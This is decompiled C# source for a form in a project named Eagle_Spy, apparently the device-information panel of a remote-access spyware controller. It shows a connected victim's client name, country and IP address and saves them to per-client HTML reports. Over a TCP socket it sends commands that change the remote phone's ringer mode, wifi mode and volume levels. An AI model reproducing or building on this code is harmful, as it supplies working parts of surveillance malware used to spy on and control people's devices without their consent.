using System;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Eagle_Spy.sockets;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x0200006C RID: 108
	[DesignerGenerated]
	public partial class information : Form
	{
		// Token: 0x06000674 RID: 1652 RVA: 0x000B0330 File Offset: 0x000AE530
		public information()
		{
			base.Load += this.info_Load;
			this.Title = "null";
			this.tmpTable = null;
			this.DS = null;
			this.InitializeComponent();
			this.Font = reso.f;
		}

		// Token: 0x06000675 RID: 1653 RVA: 0x000B0380 File Offset: 0x000AE580
		private void translateme()
		{
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", false) != 0)
			{
				if (Operators.CompareString(language, "CN", false) == 0)
				{
					this.LB1.Text = Codes.Translate(this.LB1.Text, "en", "zh");
					this.LB2.Text = Codes.Translate(this.LB2.Text, "en", "zh");
					this.LB3.Text = Codes.Translate(this.LB3.Text, "en", "zh");
					this.LB4.Text = Codes.Translate(this.LB4.Text, "en", "zh");
					this.LB5.Text = Codes.Translate(this.LB5.Text, "en", "zh");
					this.LB7.Text = Codes.Translate(this.LB7.Text, "en", "zh");
					this.LB6.Text = Codes.Translate(this.LB6.Text, "en", "zh");
					return;
				}
			}
			else
			{
				this.LB1.Text = Codes.Translate(this.LB1.Text, "en", "ar");
				this.LB2.Text = Codes.Translate(this.LB2.Text, "en", "ar");
				this.LB3.Text = Codes.Translate(this.LB3.Text, "en", "ar");
				this.LB4.Text = Codes.Translate(this.LB4.Text, "en", "ar");
				this.LB5.Text = Codes.Translate(this.LB5.Text, "en", "ar");
				this.LB6.Text = Codes.Translate(this.LB6.Text, "en", "ar");
				this.LB7.Text = Codes.Translate(this.LB7.Text, "en", "ar");
			}
		}

		// Token: 0x06000676 RID: 1654 RVA: 0x00003FCC File Offset: 0x000021CC
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
				return;
			}
			this.TOpacity.Enabled = false;
		}

		// Token: 0x06000677 RID: 1655 RVA: 0x000B05BC File Offset: 0x000AE7BC
		public void grreSize()
		{
			checked
			{
				foreach (DataGridView dataGridView in this.Panel1.Controls.OfType<DataGridView>())
				{
					int num = dataGridView.Rows.Count * dataGridView.Rows[0].Height;
					dataGridView.Height = num + 5;
				}
			}
		}

		// Token: 0x06000678 RID: 1656 RVA: 0x000B0634 File Offset: 0x000AE834
		private void info_Load(object sender, EventArgs e)
		{
			this.SaveToolStripMenuItem.Visible = true;
			this.SaveAsToolStripMenuItem.Visible = true;
			base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\11.ico");
			this.translateme();
			this.grreSize();
			this.Text = this.Title;
			this.TOpacity.Interval = SpySettings.T_Interval;
			this.TOpacity.Enabled = true;
		}

		// Token: 0x06000679 RID: 1657 RVA: 0x000B06A8 File Offset: 0x000AE8A8
		private void ClearSEL(DataGridView DG0)
		{
			foreach (DataGridView dataGridView in this.Panel1.Controls.OfType<DataGridView>())
			{
				if (Operators.CompareString(dataGridView.Name, DG0.Name, false) != 0 && dataGridView.Rows.Count > 0)
				{
					dataGridView.CurrentCell = dataGridView.Rows[0].Cells[0];
					dataGridView.ClearSelection();
				}
			}
		}

		// Token: 0x0600067A RID: 1658 RVA: 0x00004002 File Offset: 0x00002202
		private void DGV0_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.ClearSEL(this.DGV0);
		}

		// Token: 0x0600067B RID: 1659 RVA: 0x00004010 File Offset: 0x00002210
		private void DGV1_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.ClearSEL(this.DGV1);
		}

		// Token: 0x0600067C RID: 1660 RVA: 0x0000401E File Offset: 0x0000221E
		private void DGV2_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.ClearSEL(this.DGV2);
		}

		// Token: 0x0600067D RID: 1661 RVA: 0x0000402C File Offset: 0x0000222C
		private void DGV3_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.ClearSEL(this.DGV3);
		}

		// Token: 0x0600067E RID: 1662 RVA: 0x0000403A File Offset: 0x0000223A
		private void DGV4_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.ClearSEL(this.DGV4);
		}

		// Token: 0x0600067F RID: 1663 RVA: 0x00004048 File Offset: 0x00002248
		private void DGV5_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.ClearSEL(this.DGV5);
		}

		// Token: 0x06000680 RID: 1664 RVA: 0x00004056 File Offset: 0x00002256
		private void DGV6_CellEnter(object sender, DataGridViewCellEventArgs e)
		{
			this.ClearSEL(this.DGV6);
		}

		// Token: 0x06000681 RID: 1665 RVA: 0x00004064 File Offset: 0x00002264
		private void DGV5_CellBeginEdit(object sender, DataGridViewCellCancelEventArgs e)
		{
			this.EventName = "DGV5";
			this.EventArgs = e;
		}

		// Token: 0x06000682 RID: 1666 RVA: 0x00004078 File Offset: 0x00002278
		private void DGV6_CellBeginEdit(object sender, DataGridViewCellCancelEventArgs e)
		{
			this.EventName = "DGV6";
			this.EventArgs = e;
		}

		// Token: 0x06000683 RID: 1667 RVA: 0x000B0740 File Offset: 0x000AE940
		private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.tmpTable != null)
			{
				reso.Directory_Exist(this.classClient);
				if (this.DS == null)
				{
					this.DS = new DataSet("info");
					this.DS.Tables.Add(this.tmpTable);
				}
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					reso.SAVEit((Array)a0);
				}, new object[]
				{
					this.DS,
					this.tmpFolderUSER,
					"informations",
					this.tmpClientName,
					this.tmpCountry + " - " + this.tmpAddressIP,
					"informations",
					"info",
					DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
				});
			}
		}

		// Token: 0x06000684 RID: 1668 RVA: 0x000B0828 File Offset: 0x000AEA28
		private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
			saveFileDialog.Filter = "html (*.html)|*.html";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				if (this.DS == null)
				{
					this.DS = new DataSet("info");
					this.DS.Tables.Add(this.tmpTable);
				}
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					reso.SAVEit((Array)a0);
				}, new object[]
				{
					this.DS,
					"null",
					saveFileDialog.FileName,
					this.tmpClientName,
					this.tmpCountry + " - " + this.tmpAddressIP,
					"informations",
					"info",
					"null"
				});
			}
			saveFileDialog.Dispose();
		}

		// Token: 0x06000685 RID: 1669 RVA: 0x000B0928 File Offset: 0x000AEB28
		private void ComboBox_SelectedIndexChanged(object sender, EventArgs e)
		{
			ComboBox comboBox = (ComboBox)sender;
			if (comboBox == null || comboBox.Text.Length <= 0 || this.EventArgs == null || !((this.EventArgs.ColumnIndex != -1) & (this.EventArgs.RowIndex != -1) & (Operators.CompareString(this.EventName, null, false) != 0)))
			{
				return;
			}
			string eventName = this.EventName;
			if (Operators.CompareString(eventName, "DGV5", false) != 0)
			{
				if (Operators.CompareString(eventName, "DGV6", false) == 0)
				{
					if ((this.EventArgs.ColumnIndex == 1) & (this.EventArgs.RowIndex == 0))
					{
						this.change("ringer_mode", Conversions.ToString(comboBox.SelectedIndex));
						return;
					}
					if ((this.EventArgs.ColumnIndex == 1) & (this.EventArgs.RowIndex == 1))
					{
						this.change("wifi_mode", Conversions.ToString(comboBox.SelectedIndex));
						return;
					}
				}
			}
			else
			{
				if ((this.EventArgs.ColumnIndex == 1) & (this.EventArgs.RowIndex == 0))
				{
					this.change("ring", Conversions.ToString(comboBox.SelectedIndex));
					return;
				}
				if ((this.EventArgs.ColumnIndex == 1) & (this.EventArgs.RowIndex == 1))
				{
					this.change("music", Conversions.ToString(comboBox.SelectedIndex));
					return;
				}
				if ((this.EventArgs.ColumnIndex == 1) & (this.EventArgs.RowIndex == 2))
				{
					this.change("notification", Conversions.ToString(comboBox.SelectedIndex));
					return;
				}
				if ((this.EventArgs.ColumnIndex == 1) & (this.EventArgs.RowIndex == 3))
				{
					this.change("system", Conversions.ToString(comboBox.SelectedIndex));
				}
			}
		}

		// Token: 0x06000686 RID: 1670 RVA: 0x000B0AFC File Offset: 0x000AECFC
		private void change(string num, string vul)
		{
			if (this.classClient != null)
			{
				object[] array = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".info",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.resultClient,
						Data.SPL_SOCKET,
						num,
						Data.SPL_DATA,
						vul
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x06000687 RID: 1671 RVA: 0x000B0BB8 File Offset: 0x000AEDB8
		private void DGV5_EditingControlShowing(object sender, DataGridViewEditingControlShowingEventArgs e)
		{
			ComboBox comboBox = (ComboBox)e.Control;
			if (!Information.IsNothing(RuntimeHelpers.GetObjectValue(comboBox.SelectedItem)))
			{
				if (!Information.IsNothing(this.LastComboDGV5))
				{
					this.LastComboDGV5.SelectionChangeCommitted -= this.ComboBox_SelectedIndexChanged;
				}
				this.LastComboDGV5 = comboBox;
				this.LastComboDGV5.SelectionChangeCommitted += this.ComboBox_SelectedIndexChanged;
			}
		}

		// Token: 0x06000688 RID: 1672 RVA: 0x000B0C28 File Offset: 0x000AEE28
		private void DGV6_EditingControlShowing(object sender, DataGridViewEditingControlShowingEventArgs e)
		{
			ComboBox comboBox = (ComboBox)e.Control;
			if (!Information.IsNothing(RuntimeHelpers.GetObjectValue(comboBox.SelectedItem)))
			{
				if (!Information.IsNothing(this.LastComboDGV6))
				{
					this.LastComboDGV6.SelectionChangeCommitted -= this.ComboBox_SelectedIndexChanged;
				}
				this.LastComboDGV6 = comboBox;
				this.LastComboDGV6.SelectionChangeCommitted += this.ComboBox_SelectedIndexChanged;
			}
		}

		// Token: 0x0400073D RID: 1853
		public TcpClient Client;

		// Token: 0x0400073E RID: 1854
		public Client classClient;

		// Token: 0x0400073F RID: 1855
		public string Title;

		// Token: 0x04000740 RID: 1856
		private ComboBox LastComboDGV5;

		// Token: 0x04000741 RID: 1857
		private ComboBox LastComboDGV6;

		// Token: 0x04000742 RID: 1858
		private DataGridViewCellCancelEventArgs EventArgs;

		// Token: 0x04000743 RID: 1859
		private string EventName;

		// Token: 0x04000744 RID: 1860
		public DataTable tmpTable;

		// Token: 0x04000745 RID: 1861
		public string tmpFolderUSER;

		// Token: 0x04000746 RID: 1862
		public string tmpClientName;

		// Token: 0x04000747 RID: 1863
		public string tmpCountry;

		// Token: 0x04000748 RID: 1864
		public string tmpAddressIP;

		// Token: 0x04000749 RID: 1865
		public DataSet DS;
	}
}
